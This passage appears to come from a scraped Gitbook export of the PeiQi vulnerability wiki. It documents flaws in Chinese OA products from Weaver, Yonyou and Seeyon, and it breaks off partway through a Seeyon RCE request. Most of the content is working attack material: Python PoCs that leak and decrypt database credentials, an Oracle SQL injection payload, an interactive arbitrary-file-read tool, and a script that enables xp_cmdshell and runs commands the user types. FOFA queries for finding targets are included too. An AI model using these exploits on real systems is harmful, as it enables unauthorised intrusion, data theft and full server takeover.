数据库配置信息泄漏漏洞.html","title":"泛微OA e-cology 数据库配置信息泄漏漏洞","keywords":"","body":"泛微OA e-cology 数据库配置信息泄漏漏洞 漏洞描述 2019年10月24日，360CERT监测到友商发布了泛微e-cology OA数据库配置信息泄漏漏洞预警，漏洞等级中。 攻击者可通过存在漏洞的页面直接获取到数据库配置信息。如果攻击者可直接访问数据库，则可直接获取用户数据，甚至可以直接控制数据库服务器。 360CERT判断漏洞等级为中，危害面/影响面低。建议使用泛微e-cology OA的用户及时安装最新补丁，以免遭受黑客攻击。 影响版本 [!NOTE] 目前已知为8.100.0531,不排除其他版本，包括不限于EC7.0、EC8.0、EC9.0版 漏洞复现 根据源码可以得到DES密钥为 1z2x3c4v5b6n（也有1z2x3c4v的,可以按此规律来爆破） 可以看到会将当前连接数据库的用户名密码，url，logintype等信息进行des加密，并最终进行返回，可以直接通过des解密获取泄露信息。 漏洞利用POC Github链接 python代码 import base64 import requests import ast def req(url): headers = { 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', } r1 = requests.get(url,headers=headers).content s = r1.replace('\\r\\n','') res1 = base64.b64encode(s) postdata = { 'data':res1, 'type':'des', 'arg':'m=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1' } u = 'http://tool.chacuo.net/cryptdes' r2 = requests.post(u,data=postdata,headers=headers).content res2 = ast.literal_eval(r2) return res2['data'] url = 'http://xxx.xxx.xxx.xxx:8888//mobile/DBconfigReader.jsp' print req(url) 参考文章 [更新]泛微e-cology OA数据库配置信息泄漏漏洞预警 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传.html":{"url":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传.html","title":"泛微OA sysinterfacecodeEdit.jsp 页面任意文件上传","keywords":"","body":"泛微OA sysinterface/codeEdit.jsp 页面任意文件上传 WooYun-2015-0155705 漏洞描述 泛微OA sysinterface/codeEdit.jsp 页面任意文件上传导致可以上传恶意文件 漏洞描述 [!NOTE] 较老版本，目前无准确版本 漏洞复现 filename=******5308.java&filetype=javafilename为文件名称 为空时会自动创建一个 String fileid = \"Ewv\"; String readonly = \"\"; boolean isCreate = false; if(StringHelper.isEmpty(fileName)) { Date ndate = new Date(); SimpleDateFormat sf = new SimpleDateFormat(\"yyyyMMddHHmmss\"); String datetime = sf.format(ndate); fileid = fileid + datetime; fileName= fileid + \".\" + filetype; isCreate = true; } else { int pointIndex = fileName.indexOf(\".\"); if(pointIndex > -1) { fileid = fileName.substring(0,pointIndex); }} 参考文章 泛微OA未授权可导致GetShell PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA WorkflowCenterTreeData接口SQL注入.html":{"url":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA WorkflowCenterTreeData接口SQL注入.html","title":"泛微OA WorkflowCenterTreeData接口SQL注入","keywords":"","body":"泛微OA WorkflowCenterTreeData接口SQL注入(仅限oracle数据库) CNVD-2019-34241 漏洞描述 2019年10月10日CNVD发布了泛微e-cology OA系统存在SQL注入漏洞。该漏洞是由于OA系统的WorkflowCenterTreeData接口中涉及Oracle数据库的SQL语句缺乏安全检查措施所导致的，任意攻击者都可借SQL语句拼接时机注入恶意payload，造成SQL注入攻击。 影响版本 [!NOTE] 使用Oracle数据库的泛微服务 漏洞复现 泛型微生态OA系统的WorkflowCenterTreeData接口在使用Oracle数据库时，由于内置sql语句分解不严密，导致其存在的sql注入漏洞 漏洞请求包 POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1 Host: ip:port Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ecology_JSessionId=abc49y8JvMcoqhSkCv02w; testBanCookie=test Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 漏洞利用POC import requests import sys headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded' } def exploit(url): target=url+'/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333' payload=\"formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1\" res=requests.post(url=target,data=payload,headers=headers,timeout=10) res.encoding=res.apparent_encoding print(res.text) if __name__ == '__main__': url=sys.argv[1] exploit(url) 参考文章 泛微OA WorkflowCenterTreeData接口注入复现（仅限oracle数据库） PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微云桥 e-Bridge 任意文件读取.html":{"url":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微云桥 e-Bridge 任意文件读取.html","title":"泛微云桥 e-Bridge 任意文件读取","keywords":"","body":"泛微云桥 e-Bridge 任意文件读取 漏洞描述 泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。 影响版本 [!NOTE] 泛微云桥 e-Bridge 2018-2019 多个版本 FOFA [!NOTE] title=\"泛微云桥e-Bridge\" 漏洞复现 [!NOTE] 分为两种，分别为 Windows 和 Linux Windows 访问 http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt 成功返回 id值,说明含有此漏洞 调用查看文件接口访问 http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值 Linux 访问 http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt 成功返回 id值,说明含有此漏洞 调用查看文件接口访问 http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值 漏洞利用POC [!NOTE] 注意读取Linux系统文件时，需要完整路径 例如读取根目录下的 1.txt 应为 /1.txt 而不是 1.txt #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 泛微云桥 e-Bridge \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') # 判断操作系统 or 判断漏洞是否可利用 def POC_1(target_url): vuln_url_1 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt\" vuln_url_2 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt\" vuln_url_3 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response_1 = requests.get(url=vuln_url_1, headers=headers, verify=False, timeout=10) response_2 = requests.get(url=vuln_url_2, headers=headers, verify=False, timeout=10) response_3 = requests.get(url=vuln_url_3, headers=headers, verify=False, timeout=10) if \"无法验证您的身份\" in response_1.text and \"无法验证您的身份\" in response_2.text: print(\"\\033[31m[x] 漏洞已修复，不存在漏洞 \\033[0m\") sys.exit(0) else: if \"No such file or directory\" in response_1.text: print(\"\\033[32m[o] 目标为 Linux 系统\\033[0m\") id = re.findall(r'\"id\":\"(.*?)\"', response_3.text)[0] print(\"\\033[32m[o] 成功获取id：{}\\033[0m\".format(id)) return id,\"linux\" elif \"系统找不到指定的路径\" in response_2.text: print(\"\\033[32m[o] 目标为 Windows 系统\\033[0m\") id = re.findall(r'\"id\":\"(.*?)\"', response_1.text)[0] print(\"\\033[32m[o] 成功获取id：{}\\033[0m\".format(id)) return id,\"windows\" else: print(\"\\033[31m[x] 无法获取目标系统\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # 验证漏洞 def POC_2(target_url, id): file_url = target_url + \"/file/fileNoLogin/{}\".format(id) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) response.encoding = 'GBK' print(\"\\033[32m[o] 成功读取：\\n\\033[0m{}\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # windows 文件读取 def POC_3(target_url, File): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/{}&fileExt=txt\".format(File) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) id = re.findall(r'\"id\":\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] 成功获取id：{}\\033[0m\".format(id)) POC_2(target_url, id) except : print(\"\\033[31m[x] 请求失败，无法读取文件 \\033[0m)\") # linux读取文件 def POC_4(target_url, File): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{}&fileExt=txt\".format(File) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) id = re.findall(r'\"id\":\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] 成功获取id：{}\\033[0m\".format(id)) POC_2(target_url, id) except: print(\"\\033[31m[x] 请求失败，无法读取文件 \\033[0m)\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) id,system = POC_1(target_url) POC_2(target_url, id) while True: if system == \"windows\": File = input(\"\\033[35mFile >>> \\033[0m\") if File == \"exit\": sys.exit(0) else: POC_3(target_url, File) if system == \"linux\": File = input(\"\\033[35mFile >>> \\033[0m\") if File == \"exit\": sys.exit(0) else: POC_4(target_url, File) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/用友OA/":{"url":"PeiQi_Wiki/OA产品漏洞/用友OA/","title":"用友OA","keywords":"","body":"用友 用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/用友OA/用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923.html":{"url":"PeiQi_Wiki/OA产品漏洞/用友OA/用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923.html","title":"用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923","keywords":"","body":"用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923 漏洞描述 用友GRP-u8存在XXE漏洞，该漏洞源于应用程序解析XML输入时没有进制外部实体的加载，导致可加载外部SQL语句，以及命令执行 影响版本 [!NOTE] 用友GRP-U8行政事业内控管理软件（新政府会计制度专版） FOFA [!NOTE] title=\"用友GRP-U8行政事业内控管理软件\" 漏洞复现 漏洞利用POC请求包 POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=XML AS_DataRequest ProviderNameDataSetProviderData Dataselect @@version 请求后按F12查看源代码可以得到SQL语句查询结果 也可以调用 xp_cmdshell 来执行系统命令(大部分此系统为windows) [!NOTE] 注意：大部分默认是不开启 xp_cmdshell 模块的 可以使用如下方法打开xp_cmdshell方法 将如下POST数据按顺序发送(注意 master 改为当前数据库名) cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatause master cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec sp_configure 'show advanced options',1 cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatareconfigure cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec sp_configure 'xp_cmdshell',1 cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatareconfigure [!NOTE] 发送如上实际为执行SQL语句打开 xp_cmdshell use master; exec sp_configure 'show advanced options',1; reconfigure; exec sp_configure 'xp_cmdshell',1; reconfigure; 再发送以下数据可成功使用(也可能失败) cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"whoami\" [!NOTE] 执行过程中报错 java.sql.SQLException【错误代码: 0; 相关信息:xxxxxx】不用理会 发送请求后再使用此模块则会成功请求执行系统命令 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 用友GRP-U8行政事业内控管理软件 \\033[0m') print('+ \\033[36m使用格式: python3 CNNVD-201610-923.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36m(Y/N) >>> Y or N \\033[0m') print('+ \\033[36mcmd >>> ipconfig \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataselect 1,user,db_name(),host_name(),@@version\"\"\" try: print(\"\\033[32m[o] 正在执行SQL语句:select 1,user,db_name(),host_name(),@@version...\\033[0m\") response = requests.post(url=check_url, headers=headers, data=data, timeout=10) row_1 = '> 数据库用户为:{}\\033[0m\".format(db_user)) print(\"\\033[32m >> 数据库名为:{}\\033[0m\".format(db_name)) print(\"\\033[32m >> 数据库主机名为:{}\\033[0m\".format(db_host)) print(\"\\033[32m >> 数据库版本为:{}\\033[0m\".format(db_vers)) return db_name else: print(\"\\033[31m[x] 漏洞已被修复 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) def xp_cmdshell_open(target_url, db_name): open_sql = [\"use {}\".format(db_name),\"exec sp_configure 'show advanced options',1\",\"reconfigure\",\"exec sp_configure 'xp_cmdshell',1\",\"reconfigure\"] num = 1 for sql in open_sql: open_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataData{}'.format(sql) try: print(\"\\033[32m[o] 正在执行SQL语句:{}...\\033[0m\".format(sql)) response = requests.post(url=open_url, headers=headers, data=data, timeout=10) num = num + 1 if num == 5 : POC_2(target_url, db_name) except: print(\"\\033[31m[x] 开启 xp_cmdsheall 失败 \\033[0m\") sys.exit(0) def POC_2(target_url, db_name): db_name = db_name sql_cmd_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"whoami\"\"\"\" try: print(\"\\033[32m[o] 正在执行SQL语句:exec xp_cmdshell 'whoami'...\\033[0m\") response = requests.post(url=sql_cmd_url, headers=headers, data=data, timeout=10) if 'exec xp_cmdshell' in response.text: print(\"\\033[31m[x] 数据库未开启 xp_cmdshell 模块\\033[0m\") sqlcmd_open = str(input(\"\\033[35m是否开启 xp_cmdshell\\n(Y/N) >>> \\033[0m\")) if sqlcmd_open == 'Y' or sqlcmd_open == 'y': xp_cmdshell_open(target_url, db_name) else: print(\"\\033[31m[x] 停止开启 xp_cmdshell \\033[0m\") sys.exit(0) else: whoami = re.findall(r'output=\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] 成功执行SQL语句:exec xp_cmdshell 'whoami'...\\n>>> {}\\033[0m\".format(whoami)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, cmd): vuln_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"{}\"'.format(cmd) try: print(\"\\033[32m[o] 正在执行SQL语句:exec xp_cmdshell '{}'...\\033[0m\".format(cmd)) response = requests.post(url=vuln_url, headers=headers, data=data, timeout=10) data = re.findall(r'output=\"(.*?)\"', response.text) for i in data: print(\"\\033[32m >>> {}\\033[0m\".format(i)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) db_name = POC_1(target_url) POC_2(target_url, db_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_3(target_url, cmd) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/致远OA/":{"url":"PeiQi_Wiki/OA产品漏洞/致远OA/","title":"致远OA","keywords":"","body":"致远OA 致远OA A8 htmlofficeservlet RCE漏洞 致远OA Session泄漏漏洞 致远OA ajax.do登录绕过 任意文件上传 CNVD-2021-01627 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A8 htmlofficeservlet RCE漏洞.html":{"url":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA A8 htmlofficeservlet RCE漏洞.html","title":"致远OA A8 htmlofficeservlet RCE漏洞","keywords":"","body":"致远 OA A8 htmlofficeservlet RCE漏洞 漏洞描述 该漏洞最早于6月26号左右，有安全厂商发出漏洞预警。 远程攻击者在无需登录的情况下可通过向 URL /seeyon/htmlofficeservlet POST 精心构造的数据即可向目标服务器写入任意文件，写入成功后可执行任意系统命令进而控制目标服务器。 FOFA [!NOTE] title=\"致远A8-V5协同管理软件 V6.1sp1\" 影响版本 [!NOTE] 致远A8-V5协同管理软件V6.1sp1 致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远A8+协同管理软件V7.1 漏洞复现 访问目标站点 http://xxx.xxx.xxx.xxx:8088/seeyon/htmlofficeservlet 出现如下图响应，则可能含有漏洞 使用POST请求发出如下请求包 DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 